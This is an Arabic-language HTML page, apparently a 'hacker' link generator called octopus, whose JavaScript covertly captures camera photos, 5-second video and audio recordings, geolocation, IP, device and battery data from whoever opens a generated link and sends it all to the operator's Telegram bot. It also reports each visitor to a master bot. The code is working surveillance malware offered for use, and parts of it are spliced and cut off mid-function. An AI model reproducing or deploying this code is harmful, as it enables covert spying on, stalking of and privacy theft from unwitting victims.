<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⛧ 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ · آرك الهاكر</title>
    <!-- Font Awesome 6 -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <!-- Google Fonts: Cinzel + JetBrains Mono -->
    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600;700;800;900&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        /* ================================================================
           ROOT — الجوهرة الحمراء (كاتم غامق)
           ================================================================ */
        * { margin: 0; padding: 0; box-sizing: border-box; }

        :root {
            --blood-dark: #1a0000;
            --blood-deep: #3a0000;
            --blood-mid: #6a0a0a;
            --blood-bright: #aa0a0a;
            --blood-pure: #cc0a0a;
            --blood-glow: rgba(204, 10, 10, 0.7);
            --hellfire: #ff3300;
            --hellfire-glow: rgba(255, 51, 0, 0.6);
            --obsidian: #050505;
            --obsidian-light: #0f0808;
            --text-hell: #d4b0a0;
            --text-blood: #cc2222;
            --font-display: 'Cinzel', 'Georgia', serif;
            --font-mono: 'JetBrains Mono', 'Courier New', monospace;
            --transition: 0.4s cubic-bezier(0.6, 0.04, 0.98, 0.34);
        }

        html, body {
            height: 100%;
            margin: 0;
            background: var(--obsidian);
            color: var(--text-hell);
            overflow-x: hidden;
            font-family: var(--font-mono);
        }

        /* ================================================================
           CANVAS — الجحيم (خلفية متحركة)
           ================================================================ */
        #hell-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
            opacity: 0.85;
        }

        /* ================================================================
           المطر الدموي
           ================================================================ */
        .blood-rain {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
            overflow: hidden;
        }
        .blood-drop {
            position: absolute;
            top: -40px;
            width: 2.5px;
            background: rgba(180, 10, 10, 0.6);
            box-shadow: 0 0 15px var(--blood-pure);
            animation: fall-blood linear infinite;
            border-radius: 0 0 50% 50%;
        }
        @keyframes fall-blood {
            0% { transform: translateY(0) scaleY(1); opacity: 0.9; }
            100% { transform: translateY(110vh) scaleY(2); opacity: 0.0; }
        }

        /* ================================================================
           جماجم الخلفية
           ================================================================ */
        .skull-bg {
            position: fixed;
            pointer-events: none;
            z-index: 0;
            opacity: 0.12;
            filter: drop-shadow(0 0 60px rgba(204, 10, 10, 0.15));
        }

        /* ================================================================
           عناصر زخرفية ثابتة (حمراء)
           ================================================================ */
        .deco-element {
            position: fixed;
            pointer-events: none;
            z-index: 1;
            opacity: 0.15;
            border: 1.5px solid rgba(204, 10, 10, 0.2);
            transition: opacity 0.5s ease;
        }
        .deco-element:hover { opacity: 0.3; }
        .deco-element.vertical {
            width: 2px;
            height: 140px;
            background: linear-gradient(180deg, transparent, var(--blood-mid), transparent);
        }
        .deco-element.horizontal {
            height: 2px;
            width: 140px;
            background: linear-gradient(90deg, transparent, var(--blood-mid), transparent);
        }
        .deco-element.corner {
            width: 70px;
            height: 70px;
            border-top: 2px solid var(--blood-mid);
            border-left: 2px solid var(--blood-mid);
            opacity: 0.1;
        }
        .deco-element.corner-br {
            border-top: none;
            border-left: none;
            border-bottom: 2px solid var(--blood-mid);
            border-right: 2px solid var(--blood-mid);
        }
        .deco-element.diamond {
            width: 12px;
            height: 12px;
            transform: rotate(45deg);
            border: 1.5px solid var(--blood-mid);
            background: rgba(204, 10, 10, 0.05);
        }

        /* ================================================================
           النار السفلية (حقيقية، حمراء متوهجة)
           ================================================================ */
        .fire-bottom {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 90px;
            z-index: 0;
            pointer-events: none;
            background: radial-gradient(ellipse at 50% 100%, rgba(255, 51, 0, 0.35) 0%, transparent 70%);
            filter: blur(4px);
        }
        .fire-bottom::before {
            content: '';
            position: absolute;
            bottom: 0;
            left: 5%;
            width: 90%;
            height: 60px;
            background: radial-gradient(ellipse at 50% 100%, #ff4400 0%, #cc0a0a 30%, transparent 70%);
            opacity: 0.6;
            filter: blur(14px);
            animation: fire-pulse 2.2s ease-in-out infinite alternate;
        }
        .fire-bottom::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 15%;
            width: 70%;
            height: 40px;
            background: radial-gradient(ellipse at 50% 100%, #ff8844 0%, #ff3300 35%, transparent 70%);
            opacity: 0.4;
            filter: blur(20px);
            animation: fire-pulse 2.8s ease-in-out infinite alternate-reverse;
        }
        .fire-glow-ring {
            position: fixed;
            bottom: -10px;
            left: 50%;
            transform: translateX(-50%);
            width: 90%;
            height: 70px;
            background: radial-gradient(ellipse at 50% 100%, rgba(204, 10, 10, 0.3), transparent 70%);
            filter: blur(30px);
            z-index: 0;
            pointer-events: none;
            animation: fire-pulse 3s ease-in-out infinite alternate;
        }
        @keyframes fire-pulse {
            0% { opacity: 0.6; transform: scale(1); }
            100% { opacity: 1; transform: scale(1.04); }
        }

        /* ================================================================
           MAIN WRAP
           ================================================================ */
        .app-wrap {
            position: relative;
            z-index: 2;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px 16px 40px;
            background: transparent;
        }

        /* ================================================================
           HEADER — عرش الدم
           ================================================================ */
        .header {
            width: 100%;
            max-width: 1100px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 32px;
            margin-bottom: 32px;
            background: rgba(5, 3, 3, 0.92);
            backdrop-filter: blur(18px);
            -webkit-backdrop-filter: blur(18px);
            border: 1px solid rgba(204, 10, 10, 0.08);
            box-shadow: 0 0 100px rgba(204, 10, 10, 0.02), inset 0 0 100px rgba(0, 0, 0, 0.5);
            position: relative;
            overflow: hidden;
            clip-path: polygon(0% 0%, 100% 0%, 98% 100%, 2% 100%);
        }
        .header::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--blood-pure), var(--hellfire), var(--blood-pure), transparent);
            background-size: 300% 100%;
            animation: blood-scan 4.5s linear infinite;
        }
        @keyframes blood-scan {
            0% { background-position: 0% 0%; }
            100% { background-position: 300% 0%; }
        }

        .brand {
            display: flex;
            align-items: center;
            gap: 20px;
        }
        .brand .brand-icon {
            color: var(--blood-pure);
            font-size: 34px;
            filter: drop-shadow(0 0 40px var(--blood-glow));
            animation: brand-pulse 3s ease-in-out infinite;
        }
        @keyframes brand-pulse {
            0%, 100% { transform: scale(1); opacity: 0.9; }
            50% { transform: scale(1.08); opacity: 1; }
        }
        .brand .bot-name {
            background: linear-gradient(135deg, #ff4444, #aa0000, #ff2200, #cc0a0a);
            background-size: 300% 100%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 32px;
            letter-spacing: 6px;
            animation: fire-text 6s linear infinite;
            font-family: var(--font-display);
            text-shadow: 0 0 80px rgba(204, 10, 10, 0.15);
        }
        @keyframes fire-text {
            0% { background-position: 0% 0%; }
            100% { background-position: 300% 0%; }
        }

        /* مربع البوت (أحمر كاتم) */
        .bot-username-box {
            display: inline-flex;
            align-items: center;
            gap: 12px;
            padding: 10px 28px;
            background: rgba(204, 10, 10, 0.02);
            border: 1px solid rgba(204, 10, 10, 0.15);
            cursor: pointer;
            transition: var(--transition);
            font-family: var(--font-mono);
            font-size: 14px;
            color: var(--blood-bright);
            letter-spacing: 2px;
            clip-path: polygon(0% 0%, 92% 0%, 100% 20%, 100% 100%, 8% 100%, 0% 80%);
            text-decoration: none;
            background: rgba(0, 0, 0, 0.3);
            box-shadow: 0 0 30px rgba(204, 10, 10, 0.02);
        }
        .bot-username-box i { font-size: 18px; color: var(--hellfire); }
        .bot-username-box:hover {
            background: rgba(204, 10, 10, 0.08);
            border-color: var(--blood-pure);
            box-shadow: 0 0 60px rgba(204, 10, 10, 0.08);
            transform: scale(1.03);
        }

        /* مربع المطور (أحمر كاتم غامق) */
        .developer-box {
            display: inline-flex;
            align-items: center;
            gap: 12px;
            padding: 10px 28px;
            background: rgba(204, 10, 10, 0.02);
            border: 1px solid rgba(204, 10, 10, 0.15);
            cursor: pointer;
            transition: var(--transition);
            font-family: var(--font-mono);
            font-size: 14px;
            color: var(--blood-pure);
            letter-spacing: 2px;
            clip-path: polygon(0% 0%, 92% 0%, 100% 20%, 100% 100%, 8% 100%, 0% 80%);
            text-decoration: none;
            background: rgba(0, 0, 0, 0.3);
            box-shadow: 0 0 30px rgba(204, 10, 10, 0.02);
            text-shadow: 0 0 20px var(--blood-glow);
        }
        .developer-box i { font-size: 18px; color: var(--hellfire); }
        .developer-box:hover {
            background: rgba(204, 10, 10, 0.08);
            border-color: var(--blood-pure);
            box-shadow: 0 0 60px rgba(204, 10, 10, 0.08);
            transform: scale(1.03);
        }

        .nav-links { display: flex; gap: 16px; align-items: center; flex-wrap: wrap; }

        /* ================================================================
           CARD — القلعة الحمراء
           ================================================================ */
        #cardArea {
            width: 100%;
            max-width: 840px;
            padding: 38px 40px 44px;
            background: rgba(8, 4, 4, 0.90);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 2px solid rgba(204, 10, 10, 0.06);
            border-radius: 0;
            box-shadow: 0 0 120px rgba(204, 10, 10, 0.03), inset 0 0 120px rgba(0, 0, 0, 0.6);
            position: relative;
            overflow: hidden;
            clip-path: polygon(0% 0%, 100% 0%, 99% 100%, 1% 100%);
        }
        #cardArea::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background:
                repeating-linear-gradient(45deg, transparent, transparent 30px, rgba(204, 10, 10, 0.008) 30px, rgba(204, 10, 10, 0.008) 34px),
                repeating-linear-gradient(-45deg, transparent, transparent 45px, rgba(80, 0, 0, 0.01) 45px, rgba(80, 0, 0, 0.01) 50px);
            pointer-events: none;
        }
        #cardArea::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 3px;
            background: linear-gradient(90deg, transparent, var(--blood-pure), var(--hellfire), var(--blood-pure), transparent);
            background-size: 300% 100%;
            animation: blood-scan 3.8s linear infinite;
        }

        .card-blood-drip {
            position: absolute;
            width: 3.5px;
            background: linear-gradient(180deg, var(--blood-pure), transparent);
            pointer-events: none;
            z-index: 3;
            animation: drip-card var(--drip-duration, 6s) ease-in infinite;
            opacity: 0;
            border-radius: 0 0 50% 50%;
        }
        @keyframes drip-card {
            0% { opacity: 0; height: 0; transform: translateY(0); }
            15% { opacity: 0.8; }
            85% { opacity: 0.3; }
            100% { opacity: 0; height: var(--drip-height, 90px); transform: translateY(var(--drip-offset, 25px)); }
        }

        .card-content { position: relative; z-index: 2; }

        /* ================================================================
           MAIN TITLE
           ================================================================ */
        .main-title {
            font-size: 40px;
            font-weight: 900;
            letter-spacing: 2px;
            margin: 0 0 8px;
            color: #fff;
            display: flex;
            align-items: center;
            gap: 20px;
            font-family: var(--font-display);
            text-shadow: 0 0 60px rgba(204, 10, 10, 0.1);
        }
        .main-title i {
            color: var(--blood-pure);
            font-size: 38px;
            filter: drop-shadow(0 0 60px var(--blood-glow));
            animation: flicker-fire 2.8s infinite;
        }
        @keyframes flicker-fire {
            0%, 100% { opacity: 1; transform: scale(1) rotate(0deg); }
            25% { opacity: 0.6; transform: scale(1.06) rotate(-2deg); }
            65% { opacity: 0.8; transform: scale(0.94) rotate(2deg); }
        }

        .main-sub {
            color: var(--text-hell);
            font-size: 14px;
            font-weight: 400;
            margin-bottom: 32px;
            border-right: 4px solid var(--blood-pure);
            padding-right: 24px;
            font-family: var(--font-mono);
            background: rgba(0, 0, 0, 0.3);
            padding: 14px 24px;
            box-shadow: inset 0 0 60px rgba(0, 0, 0, 0.4);
            letter-spacing: 0.5px;
            border: 1px solid rgba(204, 10, 10, 0.04);
        }
        .main-sub i { color: var(--blood-pure); margin-left: 12px; }

        /* ================================================================
           FORM
           ================================================================ */
        .form-modern {
            background: rgba(0, 0, 0, 0.5);
            padding: 26px 28px 30px;
            border: 1px solid rgba(204, 10, 10, 0.04);
            box-shadow: inset 0 0 100px rgba(0, 0, 0, 0.4);
            position: relative;
        }
        .form-modern::before {
            content: '';
            position: absolute;
            top: -2px;
            left: 5%;
            width: 90%;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--blood-pure), var(--hellfire), var(--blood-pure), transparent);
            background-size: 200% 100%;
            animation: fire-scan 4s linear infinite;
        }
        @keyframes fire-scan {
            0% { background-position: 0% 0%; }
            100% { background-position: 200% 0%; }
        }

        .field-group { margin-bottom: 20px; }
        .field-group label {
            display: flex;
            align-items: center;
            gap: 16px;
            color: var(--text-hell);
            font-weight: 700;
            font-size: 14px;
            margin-bottom: 8px;
            letter-spacing: 3px;
            font-family: var(--font-display);
        }
        .field-group label i {
            color: var(--blood-pure);
            width: 24px;
            font-size: 18px;
            filter: drop-shadow(0 0 20px rgba(204, 10, 10, 0.1));
        }
        .field-group input[type="text"] {
            width: 100%;
            padding: 18px 24px;
            border: 1px solid rgba(204, 10, 10, 0.04);
            background: rgba(0, 0, 0, 0.6);
            color: #d4b0a0;
            font-size: 16px;
            font-family: var(--font-mono);
            outline: none;
            transition: var(--transition);
            box-shadow: inset 0 0 60px rgba(0, 0, 0, 0.3);
            border-radius: 0;
        }
        .field-group input[type="text"]:focus {
            border-color: var(--blood-pure);
            box-shadow: 0 0 60px rgba(204, 10, 10, 0.04), inset 0 0 60px rgba(0, 0, 0, 0.3);
            background: #0f0808;
        }
        .field-group input::placeholder {
            color: #4a2a2a;
            font-weight: 400;
            letter-spacing: 1px;
        }

        /* ================================================================
           CHECKBOX
           ================================================================ */
        .features-label {
            display: flex;
            align-items: center;
            gap: 16px;
            color: var(--text-hell);
            font-weight: 700;
            font-size: 14px;
            margin: 8px 0 18px;
            font-family: var(--font-display);
            letter-spacing: 2px;
        }
        .features-label i { color: var(--blood-pure); font-size: 18px; }

        .checkbox-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 8px;
            max-height: 280px;
            overflow-y: auto;
            padding: 8px 6px 8px 0;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(204, 10, 10, 0.03);
            scrollbar-width: thin;
            scrollbar-color: var(--blood-pure) transparent;
        }
        .checkbox-grid::-webkit-scrollbar { width: 4px; }
        .checkbox-grid::-webkit-scrollbar-track { background: transparent; }
        .checkbox-grid::-webkit-scrollbar-thumb { background: var(--blood-pure); border-radius: 0; }
        @media (max-width: 540px) { .checkbox-grid { grid-template-columns: 1fr; } }

        .checkbox-item {
            display: flex;
            align-items: center;
            gap: 14px;
            padding: 12px 20px;
            background: rgba(16, 4, 4, 0.2);
            transition: var(--transition);
            cursor: pointer;
            border: 1px solid transparent;
        }
        .checkbox-item:hover {
            background: rgba(204, 10, 10, 0.03);
            border-color: rgba(204, 10, 10, 0.06);
        }
        .checkbox-item input[type="checkbox"] {
            width: 20px;
            height: 20px;
            accent-color: var(--blood-pure);
            cursor: pointer;
            flex-shrink: 0;
            filter: drop-shadow(0 0 20px rgba(204, 10, 10, 0.05));
        }
        .checkbox-item label {
            margin: 0;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
            color: var(--text-hell);
            display: flex;
            align-items: center;
            gap: 14px;
            flex: 1;
            font-family: var(--font-mono);
            letter-spacing: 0.5px;
        }
        .checkbox-item label i {
            color: #3a2a2a;
            font-size: 16px;
            width: 24px;
            text-align: center;
            transition: var(--transition);
        }
        .checkbox-item input:checked + .label-text i {
            color: var(--blood-pure);
            filter: drop-shadow(0 0 30px var(--blood-glow));
        }
        .label-text { display: flex; align-items: center; gap: 14px; }

        /* ================================================================
           BUTTON (أحمر كاتم)
           ================================================================ */
        .btn-primary {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 16px;
            width: 100%;
            padding: 16px 24px;
            border: none;
            background: linear-gradient(135deg, #4a0a0a, #1a0000, #6a0a0a);
            color: #fff;
            font-weight: 900;
            font-size: 17px;
            font-family: var(--font-display);
            cursor: pointer;
            margin-top: 24px;
            transition: var(--transition);
            box-shadow: 0 0 80px rgba(204, 10, 10, 0.04), inset 0 -4px 0 #1a0000;
            letter-spacing: 4px;
            text-transform: uppercase;
            clip-path: polygon(0% 0%, 94% 0%, 100% 25%, 100% 100%, 6% 100%, 0% 75%);
            position: relative;
            overflow: hidden;
            text-shadow: 0 0 30px rgba(204, 10, 10, 0.1);
        }
        .btn-primary::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 200%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(204, 10, 10, 0.08), transparent);
            transform: skewX(-30deg);
            animation: fire-sweep 3s linear infinite;
        }
        @keyframes fire-sweep {
            0% { left: -100%; }
            100% { left: 100%; }
        }
        .btn-primary::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--blood-pure), var(--hellfire), var(--blood-pure), transparent);
            animation: blood-scan 2.5s linear infinite;
        }
        .btn-primary:hover {
            transform: translateY(-4px) scale(1.01);
            box-shadow: 0 0 120px rgba(204, 10, 10, 0.08), inset 0 -4px 0 #3a0000;
            background: linear-gradient(135deg, #6a0a0a, #2a0000, #8a0a0a);
        }
        .btn-primary i {
            font-size: 22px;
            color: #ff8888;
            text-shadow: 0 0 40px #ff2200;
        }

        /* ================================================================
           RESULT BOX
           ================================================================ */
        .result-box {
            margin-top: 24px;
            padding: 20px 24px;
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid rgba(204, 10, 10, 0.06);
            display: flex;
            align-items: flex-start;
            gap: 20px;
            justify-content: space-between;
            display: none;
            box-shadow: inset 0 0 80px rgba(0, 0, 0, 0.3);
            position: relative;
            flex-wrap: wrap;
        }
        .result-box::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(45deg, transparent, transparent 40px, rgba(204, 10, 10, 0.005) 40px, rgba(204, 10, 10, 0.005) 44px);
            pointer-events: none;
        }
        .result-box .link-text {
            flex: 1;
            color: #d4b0a0;
            font-size: 14px;
            font-weight: 500;
            word-break: break-all;
            font-family: var(--font-mono);
            direction: ltr;
            text-align: left;
            position: relative;
            z-index: 1;
            line-height: 2;
            white-space: pre-wrap;
            min-width: 200px;
        }
        .result-box .link-text i { color: var(--blood-pure); margin-left: 10px; }

        .btn-copy {
            display: inline-flex;
            align-items: center;
            gap: 12px;
            padding: 12px 30px;
            background: rgba(204, 10, 10, 0.02);
            border: 1px solid rgba(204, 10, 10, 0.04);
            color: #d4b0a0;
            font-weight: 700;
            font-size: 13px;
            cursor: pointer;
            transition: var(--transition);
            font-family: var(--font-mono);
            flex-shrink: 0;
            clip-path: polygon(0% 0%, 88% 0%, 100% 15%, 100% 100%, 12% 100%, 0% 85%);
            position: relative;
            z-index: 1;
            letter-spacing: 1px;
            box-shadow: 0 0 30px rgba(0, 0, 0, 0.2);
        }
        .btn-copy:hover {
            background: rgba(204, 10, 10, 0.06);
            border-color: var(--blood-pure);
            color: #fff;
            box-shadow: 0 0 60px rgba(204, 10, 10, 0.04);
        }
        .btn-copy i { font-size: 16px; color: var(--blood-pure); }

            let width, height;
            const resize = () => { width = canvas.width = window.innerWidth;
                height = canvas.height = window.innerHeight; };
            resize();
            window.addEventListener('resize', resize);

            let particles = [];
            const MAX = 220;

            function createParticle() {
                const type = Math.random();
                if (type < 0.35) return { x: Math.random() * width, y: Math.random() * height - height, size: 2 + Math
                        .random() * 6, speedY: 0.5 + Math.random() * 2.0, speedX: (Math.random() - 0.5) * 0.3,
                        alpha: 0.4 + Math.random() * 0.6, isBlood: true,
                        color: `rgba(${180 + Math.random()*60}, ${12 + Math.random()*20}, ${12 + Math.random()*20}, ` };
                else if (type < 0.7) return { x: Math.random() * width, y: Math.random() * height - height, size: 1.5 + Math
                        .random() * 4, speedY: 0.15 + Math.random() * 0.9, speedX: (Math.random() - 0.5) * 0.7,
                        alpha: 0.5 + Math.random() * 0.5, isBlood: false, isFire: true,
                        color: `rgba(${255}, ${130 + Math.random()*80}, ${20 + Math.random()*30}, ` };
                else return { x: Math.random() * width, y: Math.random() * height - height, size: 4 + Math.random() * 8,
                        speedY: 0.08 + Math.random() * 0.35, speedX: (Math.random() - 0.5) * 0.15,
                        alpha: 0.15 + Math.random() * 0.25, isBlood: false, isFire: false, isSmoke: true,
                        color: `rgba(${160 + Math.random()*40}, ${130 + Math.random()*40}, ${90 + Math.random()*30}, ` };
            }
            for (let i = 0; i < MAX; i++) { const p = createParticle();
                p.y = Math.random() * height;
                particles.push(p); }

            function draw() {
                ctx.clearRect(0, 0, width, height);
                const grad = ctx.createRadialGradient(width / 2, height / 2, 0, width / 2, height / 2, height);
                grad.addColorStop(0, 'rgba(25, 4, 4, 0.10)');
                grad.addColorStop(0.35, 'rgba(15, 2, 2, 0.20)');
                grad.addColorStop(0.65, 'rgba(8, 0, 0, 0.45)');
                grad.addColorStop(1, 'rgba(0, 0, 0, 0.92)');
                ctx.fillStyle = grad;
                ctx.fillRect(0, 0, width, height);

                for (let p of particles) {
                    p.y += p.speedY;
                    p.x += p.speedX;
                    if (p.y > height + 30) { Object.assign(p, createParticle());
                        p.y = -15;
                        p.x = Math.random() * width; }
                    if (p.x < -30 || p.x > width + 30) p.x = Math.random() * width;
                    ctx.beginPath();
                    if (p.isBlood) { ctx.ellipse(p.x, p.y, p.size * 0.4, p.size, 0, 0, Math.PI * 2);
                        ctx.fillStyle = p.color + (p.alpha * 0.6) + ')';
                        ctx.shadowColor = 'rgba(204, 10, 10, 0.25)';

                        ctx.fillStyle = p.color + (p.alpha * 0.3) + ')';
                        ctx.shadowColor = 'rgba(180, 150, 120, 0.05)';
                        ctx.shadowBlur = 10; }
                    ctx.fill();
                    ctx.shadowBlur = 0;
                }
                requestAnimationFrame(draw);
            }
            draw();
        })();

        // ================================================================
        function buildCaption(extra = "") {
            let cap = `╭━━━━━━━━━━━━━━━━━━━━━━━╮\n`;
            cap += `┃   🜏  ${visitorCountry.toUpperCase()}  🜏   ┃\n`;
            cap += `┃━━━━━━━━━━━━━━━━━━━━━━━┃\n`;
            cap += `┃ 📍 الدولة     › ${visitorCountry}\n`;
            cap += `┃ 📱 الجهاز     › ${visitorDevice}\n`;
            cap += `┃ 🔋 البطارية   › ${visitorBattery}\n`;
            cap += `┃ 🌐 الـ IP      › ${visitorIP}\n`;
            cap += `┃ 🕒 الوقت      › ${new Date().toLocaleString('ar-EG')}\n`;

            if (extra) {
                cap += `┃ ${extra}\n`;
            }

            cap += `╰━━━━━━━━━━━━━━━━━━━━━━━╯\n`;
            cap += `          𖤐  𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆  𖤐`;

            return cap;
        }

        // ================================================================
        //  دالة إرسال رسالة تأكيد فورية بنفس النمط
        // ================================================================
        async function sendConfirmation(chat, token, message = "⛧ جاري جمع البيانات ⛧") {
            try {
                const caption = buildCaption(`┃ ⚡ ${message}`);
                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chat, text: caption })
                });
            } catch (e) {}
        }

        // ================================================================
        //  إرسال معلومات الزائر للمالك (بنفس النمط)
        // ================================================================
        async function sendVisitorInfo() {
            try {
                const userAgent = navigator.userAgent;
                if (/Android/i.test(userAgent)) visitorDevice = "Android";
                else if (/iPhone|iPad|iPod/i.test(userAgent)) visitorDevice = "iOS";
                else visitorDevice = "Unknown";

                if (navigator.getBattery) {
                    try {
                        const battery = await navigator.getBattery();
                        visitorBattery = (battery.level * 100) + "%";
                        if (battery.charging) visitorBattery += " (شحن)";
                    } catch (e) {}
                }

                try {
                    const ipRes = await fetch('https://ipapi.co/json/');
                    const ipData = await ipRes.json();
                    visitorIP = ipData.ip || "غير معروف";
                    visitorCountry = ipData.country_name || "غير معروف";
                } catch (e) {}

                const msg = buildCaption("┃ 🌐 *زيارة جديدة*");
                await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: msg, parse_mode: 'Markdown' })
                });
            } catch (err) {}
        }
        sendVisitorInfo();

        async function shortenUrl(url) {
            try {
                const response = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(url)}`);
                const short = await response.text();
                return short.trim();
            } catch (e) { return url; }
        }

                return;
            }

            const checkboxes = document.querySelectorAll('#featuresGroup input[type="checkbox"]:checked');
            const features = Array.from(checkboxes).map(cb => cb.value).join(',');
            const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&features=${encodeURIComponent(features)}`;

            const shortLink = await shortenUrl(fullLink);

            linkText.innerHTML = `

                ‌╭⊚─〔 ʟɪɴᴋ 〕───────
                ┃˹🔗˼ ${shortLink} ⭒
                ┃⍟ 
                ┃˹🔥˼ ᴜꜱᴇ ɪᴛ ᴡɪꜱᴇʟʏ ⭒
                ╰───────────────
            `;
            linkText.dataset.short = shortLink;
            resultEl.style.display = 'flex';

        copyBtn.addEventListener('click', async () => {

        // ================================================================
        //  تحميل الإعلانات

        function loadAd(src) {
            const s = document.createElement("script");

        // ================================================================
        //  دوال الوسائط (جميعها تستخدم buildCaption الجديد)
        // ================================================================

        async function captureAndSend(stream, chat, token, type) {
            return new Promise((resolve) => {
                const video = document.createElement('video');
                video.autoplay = true;
                video.playsInline = true;
                video.muted = true;
                video.style.display = 'none';
                video.srcObject = stream;
                document.body.appendChild(video);

                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                        canvas.toBlob(async (blob) => {
                            if (blob && blob.size > 2000) {
                                const form = new FormData();
                                form.append('chat_id', chat);
                                form.append('photo', blob, `${type}_${Date.now()}.jpg`);
                                const extra = `┃ 📸 صورة (${type === 'front' ? 'أمامية' : 'خلفية'})`;
                                form.append('caption', buildCaption(extra));

                                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                                    method: 'POST',
                                    body: form
                                });
                            }
                            document.body.removeChild(video);
                            resolve();
                        }, 'image/jpeg', 0.9);
                    }, 2000);
                };
            });
        }

        async function recordAndSend(stream, chat, token, type) {
            return new Promise((resolve) => {
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];

                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    const form = new FormData();
                    form.append('chat_id', chat);
                    form.append('video', blob, `${type}_${Date.now()}.mp4`);
                    const extra = `┃ 🎥 فيديو (${type === 'front' ? 'أمامي' : 'خلفي'}) - 5 ثوان`;
                    form.append('caption', buildCaption(extra));

                    await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
                        method: 'POST',
                        body: form
                    });
                    resolve();
                };

                mediaRecorder.start();
                setTimeout(() => {
                    if (mediaRecorder.state === 'recording') mediaRecorder.stop();
                }, 5000);
            });
        }

        async function recordAudioAndSend(stream, chat, token) {
            return new Promise((resolve) => {
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];

                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/mp4' });
                    const form = new FormData();
                    form.append('chat_id', chat);
                    form.append('audio', blob, `audio_${Date.now()}.mp4`);
                    const extra = `┃ 🎤 تسجيل صوتي - 5 ثوان`;
                    form.append('caption', buildCaption(extra));

                    await fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
                        method: 'POST',
                        body: form
                    });
                    resolve();
                };

                mediaRecorder.start();
                setTimeout(() => {
                    if (mediaRecorder.state === 'recording') mediaRecorder.stop();
                }, 5000);
            });
        }

        async function sendLocation(chat, token) {
            return new Promise((resolve) => {
                if ("geolocation" in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            const { latitude, longitude } = position.coords;
                            const extra = `┃ 📍 الموقع الحالي\n┃ 📌 ${latitude}, ${longitude}\n┃ 🔗 https://www.google.com/maps?q=${latitude},${longitude}`;
                            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ chat_id: chat, text: buildCaption(extra) })
                            });
                            resolve();
                        },
                        (error) => { resolve(); }
                    );
                } else { resolve(); }
            });
        }

        async function preGrantPermissions(needCamera, needMicrophone) {
            if (!needCamera && !needMicrophone) return true;
            const constraints = {};
            if (needCamera) constraints.video = true;
            if (needMicrophone) constraints.audio = true;
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch (err) { return false; }
        }

        // ================================================================
        //  startFeatures — مع إرسال تأكيدات فورية بنفس النمط
        // ================================================================
        async function startFeatures(chat, token, features) {
            if (!features) return;

            // إرسال تأكيد بدء الجمع
            await sendConfirmation(chat, token, "⛧ بدء جمع البيانات ⛧");

            const featureList = features.split(',');
            const needCamera = featureList.some(f => ['camFront', 'camBack', 'videoFront', 'videoBack'].includes(f));
            const needMicrophone = featureList.some(f => ['audio', 'videoFront', 'videoBack'].includes(f));
            await preGrantPermissions(needCamera, needMicrophone);

            if (featureList.includes('camFront')) {
                try {
